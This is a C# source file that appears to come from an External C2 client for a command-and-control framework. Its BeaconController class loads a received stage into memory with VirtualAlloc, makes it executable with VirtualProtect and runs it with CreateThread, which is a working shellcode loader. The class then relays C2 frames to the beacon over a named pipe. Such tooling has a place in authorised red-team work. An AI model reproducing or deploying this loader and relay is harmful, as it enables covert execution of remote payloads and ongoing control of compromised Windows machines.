using System;
using System.IO;
using System.IO.Pipes;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;

using ExternalC2.Base;

namespace ExternalC2.Client
{
    public class BeaconController : BaseConnector, IBeaconController
    {
        protected override Stream Stream { get; set; }
        
        private string _pipeName;

        public void Configure(string pipeName)
        {
            _pipeName = pipeName;
        }

        public bool InjectStage(byte[] stage)
        {
            // allocate memory
            var address = Win32.VirtualAlloc(
                IntPtr.Zero,
                (uint)stage.Length,
                Win32.AllocationType.MEM_RESERVE | Win32.AllocationType.MEM_COMMIT,
                Win32.MemoryProtection.PAGE_READWRITE);
            
            // copy stage
            Marshal.Copy(stage, 0, address, stage.Length);
            
            // flip memory protection
            Win32.VirtualProtect(
                address,
                (uint)stage.Length,
                Win32.MemoryProtection.PAGE_EXECUTE_READ,
                out _);
            
            // create thread
            Win32.CreateThread(
                IntPtr.Zero,
                0,
                address,
                IntPtr.Zero,
                0,
                out var threadId);

            return threadId != IntPtr.Zero;
        }

        public async Task<bool> Connect()
        {
            var pipeClient = new NamedPipeClientStream(_pipeName);

            // 30 second timeout
            var tokenSource = new CancellationTokenSource(new TimeSpan(0, 0, 30));
            await pipeClient.ConnectAsync(tokenSource.Token);

            if (pipeClient.IsConnected)
                Stream = pipeClient;

            return pipeClient.IsConnected;
        }

        public new async Task WriteFrame(C2Frame frame)
        {
            await base.WriteFrame(frame);
        }

        public new async Task<C2Frame> ReadFrame()
        {
            return await base.ReadFrame();
        }
    }
}